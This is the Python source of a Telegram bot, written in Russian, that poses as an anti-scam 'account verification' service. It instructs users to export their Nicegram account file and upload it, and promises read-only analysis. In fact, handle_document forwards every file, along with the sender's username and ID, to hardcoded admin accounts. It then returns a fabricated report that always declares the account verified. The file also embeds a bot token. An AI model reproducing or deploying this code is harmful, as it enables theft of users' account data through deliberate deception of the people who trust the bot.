import logging
import hashlib
import asyncio
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
#py -m pip list
# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ID администраторов
ADMIN_IDS = [7560512832, 8493462430]  # ⚠️ Список администраторов

# Токен бота
BOT_TOKEN = '8544790072:AAHbtam2hVI3kyLMue_9_doMB2X0B-JLL54'  # ⚠️ ВСТАВЬТЕ ПОЛНЫЙ ТОКЕН

# Тексты
INSTRUCTION_TEXT = """📘 Инструкция

1️⃣ В Настройки → Nicegram → аккаунт → чуть вниз → Экспортировать как файл.
2️⃣ Пришли файл в этот чат.
3️⃣ Я проверю структуру, покажу хеши и предупреждения.

💡 Бот только анализирует файл (read-only). Переводы/ключи не требуются.
⛔️ Бот создан для защиты от скама и верификации."""

CHECK_MODE_TEXT = """2. Режим «Проверка аккаунта на жалобы и предупреждение» выбран

Отправь файл для проверки 👇

Процесс:
1) Проверка на жалобы
2) Анализ безопасности предупреждений
3) Распознание фиктивности аккаунта и его целостности
4) Финальный отчёт

Цель: анализ аккаунта по «Хеш» и выявление рисков."""


def calculate_hashes(file_data: bytes) -> dict:
    """Вычисляет MD5, SHA1 и SHA256 хеши файла"""
    return {
        'md5': hashlib.md5(file_data).hexdigest(),
        'sha1': hashlib.sha1(file_data).hexdigest(),
        'sha256': hashlib.sha256(file_data).hexdigest()
    }


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Обработчик команды /start"""
    keyboard = [
        [KeyboardButton("📘 Инструкция")],
        [KeyboardButton("🔍 Проверка аккаунта")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    await update.message.reply_text(
        "👋 Добро пожаловать!\n\n"
        "Выберите действие из меню:",
        reply_markup=reply_markup
    )


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Обработчик текстовых сообщений"""
    text = update.message.text

    if text == "📘 Инструкция":
        await update.message.reply_text(INSTRUCTION_TEXT)
    elif text == "🔍 Проверка аккаунта":
        await update.message.reply_text(CHECK_MODE_TEXT)
    else:
        await update.message.reply_text(
            "Пожалуйста, используйте меню или отправьте файл для проверки."
        )


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Обработчик файлов"""
    user = update.message.from_user
    document = update.message.document

    try:
        # Получаем файл
        file = await context.bot.get_file(document.file_id)
        file_data = await file.download_as_bytearray()

        # Вычисляем хеши
        hashes = calculate_hashes(bytes(file_data))

        # Текущее время
        check_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Формируем имя пользователя
        username = f"@{user.username}" if user.username else f"ID: {user.id}"
        full_name = f"{user.first_name or ''} {user.last_name or ''}".strip()

        # Формируем отчёт для пользователя
        report = f"""🎁 Отчёт проверки истории
Пользователь отправивший файл: {username} ({full_name})
Файл: {document.file_name}
Размер: {document.file_size} байт
Тип: {document.mime_type}
Время проверки: {check_time}

📊 Анализ безопасности:
- ✅ Архив — удобен для проверки.

🔐 Анализ транзакций (хеши):
- MD5: {hashes['md5']}
- SHA1: {hashes['sha1']}
- SHA256: {hashes['sha256']}

Статус: 🟢 ПРОВЕРЕНО

✅ Файл полностью совпадает для проверки

✅ С вашей историей всё в порядке"""

        # Отправляем отчёт пользователю
        await update.message.reply_text(report)

        # Уведомляем администраторов
        admin_notification = f"""🔔 Новый файл от пользователя

👤 Пользователь: {username} ({full_name})
🆔 User ID: {user.id}
📄 Файл: {document.file_name}
📊 Размер: {document.file_size} байт
🕐 Время: {check_time}

🔐 Хеши:
MD5: {hashes['md5']}
SHA1: {hashes['sha1']}
SHA256: {hashes['sha256']}"""

        # Отправляем уведомление всем администраторам
        for admin_id in ADMIN_IDS:
            try:
                # Отправляем уведомление администратору
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=admin_notification
                )
                # Отправляем файл администратору
                await context.bot.send_document(
                    chat_id=admin_id,
                    document=document.file_id,
                    caption=f"Файл от {username}"
                )
            except Exception as e:
                logger.error(f"Ошибка при отправке уведомления администратору {admin_id}: {e}")

    except Exception as e:
        logger.error(f"Ошибка при обработке файла: {e}")
        await update.message.reply_text(
            "❌ Произошла ошибка при обработке файла. Попробуйте ещё раз."
        )


async def main() -> None:
    """Запуск бота"""
    # Проверка токена
    if not BOT_TOKEN or BOT_TOKEN.endswith('...'):
        print("❌ Ошибка: Вставьте полный токен бота в переменную BOT_TOKEN!")
        return

    # Создаём приложение
    application = Application.builder().token(BOT_TOKEN).build()

    # Регистрируем обработчики
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # Инициализируем и запускаем бота
    await application.initialize()
    await application.start()

    print("🤖 Бот запущен и готов к работе!")
    print("📱 Напишите боту /start в Telegram")
    print("⏹️  Нажмите Ctrl+C для остановки\n")

    # Запускаем polling
    await application.updater.start_polling(drop_pending_updates=True)

    # Ждём остановки
    try:
        await asyncio.Event().wait()
    except (KeyboardInterrupt, SystemExit):
        print("\n\n👋 Останавливаем бота...")
    finally:
        await application.stop()
        await application.shutdown()


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n✅ Бот успешно остановлен!")
    except Exception as e:

        print(f"\n❌ Критическая ошибка: {e}")

